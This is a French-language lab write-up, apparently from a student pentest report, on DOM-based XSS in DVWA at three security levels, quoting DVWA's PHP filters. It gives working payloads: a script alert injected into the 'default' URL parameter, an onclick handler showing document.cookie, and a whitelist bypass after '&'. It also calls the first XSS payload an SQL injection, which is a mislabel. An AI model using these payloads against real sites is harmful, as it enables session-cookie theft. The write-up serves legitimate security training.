# 1. DOM Based XSS

Le DOM-Based XSS (Cross-Site Scripting) est une variante de vulnérabilité XSS où l'injection malveillante se produit dans le Document Object Model (DOM) côté client, sans jamais transiter par le serveur. Autrement dit, le code malveillant est interprété directement par le navigateur en manipulant des données dynamiques gérées dans le DOM, souvent à partir de l'URL ou d'autres entrées utilisateur.

## 1.1 Premier niveau - low

Nous arrivons sur une page ou l'on peux changer la langue.  

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\xssDom\1.png)

On remarque un parametre `GET` dans l'url qui est `default`.

```
http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=French
```

On va donc essayer de modifier la valeur `French` par une injection SQL basique pour voir si ca marche

```
http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(%27info%27);%3C/script%3E
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\xssDom\2.png)

On remarque que la page est vulnerable aux attaques XSS

On va donc essayer de recuperer les cookies de session en utilisant la fonction JS `document.cookie`

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\xssDom\3.png)

On arrive bien a recuperer les cookies de session en utilisant la faille.
On peux donc en deduire qu'il n'y a aucun filtre/protection .

## 1.2 Deuxieme niveau - medium

Pour le deuxieme niveau, notre hypothese est que les balises les plus simples comme `<script>` sont filtres. Il faut donc trouver un autre moyen pour trouver le cookie

Apres avoir essaye d'injecter differents payload dans l'url, on se rend compte que cela ne marche pas. On va donc essayer de modifier via le mode developpeur de chrome le script manuellement.

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\xssDom\4.png)

On rajoute un `onclick` sur le bouton `select` qui permet d'afficher les cookies

```
<input type="submit" value="Select" onclick="alert(document.cookie)">
```

![images](C:\Users\Sacha\Desktop\pentest_dvwa\rapport_dvwa\images\xssDom\5.png)

On peux regarder le code et on voit qu'il y a une condition qui verifie si il y a un parametre `<script>`, comme on le pensait.

```
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

?>
```

## 1.3 Troisieme niveau - hard

Pour celui ci, ne trouvant pas nous avons commence par regarde le code source ci-dessous :

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}

?>
```

L'administrateur a rajoute une White list qui permet "thoeriquement" de verifier que le parametre `default` contient bien une de langues dans le `switch case`. Le probleme c'est que l'on peux ecrire la langue pour passer la verification et ensuite injecter notre XSS

On va donc injecter notre XSS apres le parametre `default` avec le caractere `&`

```
http://34.163.97.167/DVWA/vulnerabilities/xss_d/?default=German&<script>alert(document.cookie);</script>
```

Et le payload est fonctionnele on retrouve bien notre cookie de session.